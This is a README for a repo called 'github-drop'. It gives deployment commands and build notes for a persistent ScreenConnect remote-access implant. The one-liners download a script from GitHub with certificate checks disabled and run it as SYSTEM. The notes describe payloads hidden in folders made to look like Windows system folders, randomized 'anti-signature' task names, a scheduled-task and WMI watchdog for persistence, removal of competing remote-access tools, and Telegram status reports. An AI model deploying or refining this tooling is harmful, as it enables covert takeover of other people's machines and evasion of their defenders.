# github-drop - competition SC deploy

## Preferred (Guest: Run as SYSTEM) — full deploy, SELF-CONTAINED (no repo dependency at deploy time)
```bat
curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o23" && call %TEMP%\own.cmd
```

## Machines stuck on old builds (T4 footer / not self-updating) — un-harden first, then deploy
S4 hardening (+h +s attribs) silently blocked every copy/move self-update. O20 strips attrs before
every write and S5 no longer locks mutable payloads. On frozen machines run this FIRST, then the deploy line:
```bat
attrib -h -s -r "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\*" & attrib -h -s -r "C:\Windows\Temp\.wucache\*" & attrib -h -s -r "C:\ProgramData\Microsoft\Diagnosis\State\.etlcache\*" & curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o23" && call %TEMP%\own.cmd
```
own.txt is now the full self-contained O23 build: embeds own_mon M14 + own_secure S6 + tg_report T8 + own_lib L4 as base64.
O22 hardening pass: exterminate runs BEFORE any install (true MSI uninstall of foreign SC products
+ services/processes/dirs + 16 disallowed RMM tools via own_lib -Action exterminate), so the SC
installer custom action never collides with rivals. Install ladder: repair-by-GUID for registered
products -> stale-dir preclean -> msiexec /i with 1618 busy-retry x2 -> REINSTALLMODE=amus ->
post-install repair-by-GUID. Monitor runs the same exterminate every tick before healing.
O20 fix: S4 hardening attr-locked the fleet (copy/move over +h +s fails silently) - O20 strips attrs before writes, verifies runner copies by build marker, S5 stops locking mutable payloads, M11 self-update unhardens before move.
O19 repair: all 4 embedded payload blocks regenerated byte-exact from sources (chunked StrReplace edits had corrupted B64_MON with phase-shifted base64 + B64_SEC/TGR/LIB were stale).
O16 fixes the launcher detach bug (RUNNER expanded at parse-time inside block -> empty -> bare-quote cmd error / fake Detached OK).
Works even if every other repo file is blocked; repo is only used for auto-updates afterwards.

## PANIC / wipe recovery
```bat
curl.exe -L --ssl-no-revoke -o "%TEMP%\rescue.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/rescue.cmd" && "%TEMP%\rescue.cmd"
```

## Telegram alerts
- State change: DOWN / RESTORED / FAIL (rate-limited 30 min while stuck).
- Hourly compact digest: `SCD|host|prim=OK|alt=OK|foreign=0|tasks=5/5|msi=13196KB|up=...|b=M9|...`
- First-deploy DEPLOY report (rich HTML) with campaign state line.
`notify.cfg` is written on deploy (token on guest only).

## After detach — wait ~90s then verify
```bat
type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
type "%SystemRoot%\Temp\.wucache\boot.err"
sc query state= all | findstr /I ScreenConnect
schtasks /Query /TN "\Microsoft\Windows\Diagnosis\Scheduled"
```

## Current build (O23 / M14 / S6 / T8 / L4)
- Self-contained single-file deploy: 4 payloads embedded as base64 inside own.cmd.
- Anti-signature identity: per-host task names (8-name pools x 4 slots) + 2-5 min jitter, seeded by COMPUTERNAME hash -> identity.cfg.
- Mutual watchdog: chain1 = 4 schtasks, chain2 = WMI event subscription (WucacheWatchdog); each re-arms the other every tick.
- Campaign state: state.json per host (prim/alt/foreign/tasks/watchdog/heals) included in TG reports.
- MSI fallback chain: sevrz -> GitHub pkg.msi -> jsDelivr pkg.msi -> local cache.
- Exterminate engine (own_lib L3): foreign SC = MSI uninstall + svc/proc/dir kill; RMM purge = AnyDesk, TeamViewer, MeshAgent, Splashtop, LogMeIn, GoTo, ConnectWise, Atera, NinjaRMM, Datto, RustDesk, Supremo, DWService, Zoho Assist, RemotePC. Only the 2 allowlisted SCs survive.
- Keep: 5f6010579852e507 + f861c8140d453427. pkg.msi sha256 = ad5cb2859a917cdc8a68eeefb0caaf21b45e797af65075ba691357aa9ff7dae1

## Rebuilding embedded payloads (after editing own_mon/own_secure/tg_report/own_lib)
```bat
python _build_embed.py   # re-embeds all 4 payloads into own.cmd + SHA256 round-trip verify
copy /y own.cmd own.txt
```
